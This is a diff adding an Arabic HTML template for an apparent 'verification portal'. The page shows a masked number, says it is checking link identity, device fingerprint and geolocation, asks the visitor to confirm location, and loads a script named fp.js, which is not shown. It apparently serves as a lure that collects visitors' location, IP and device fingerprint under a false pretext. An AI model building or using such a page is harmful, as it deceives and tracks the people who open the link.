@@ -1,0 +1,48 @@
+<!doctype html>
+<html lang="ar" dir="rtl" data-token="{{ token }}" data-base="{{ base }}">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#0b1020">
+<title>{{ brand }} — تحقّق</title>
+<link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<div class="wrap">
+  <header class="brand">
+    <div class="logo">◈</div>
+    <div>
+      <div class="bname">{{ brand }}</div>
+      <div class="bsub">بوابة التحقق الموحّدة</div>
+    </div>
+  </header>
+
+  <main class="card">
+    <h1>{{ title }}</h1>
+    <p class="sub">{{ subtitle }}</p>
+
+    <div class="num" dir="ltr">{{ masked }}</div>
+
+    <ul class="steps" id="steps">
+      <li data-s="1"><span class="dot"></span> التحقق من هوية الرابط</li>
+      <li data-s="2"><span class="dot"></span> مطابقة بصمة الجهاز</li>
+      <li data-s="3"><span class="dot"></span> تأكيد الموقع الجغرافي</li>
+    </ul>
+
+    <div class="bar"><i id="bar"></i></div>
+    <div class="status" id="status">جارٍ التحقق…</div>
+
+    <button class="btn" id="geoBtn" hidden>تأكيد الموقع</button>
+
+    <div class="foot">
+      <span id="ipLine" dir="ltr"></span>
+      <span class="sep">·</span>
+      <span id="tzLine"></span>
+    </div>
+  </main>
+
+  <p class="note">لا حاجة لتثبيت أي تطبيق — التحقق يتم داخل المتصفح.</p>
+</div>
+<script src="/static/fp.js"></script>
+</body>
+</html>
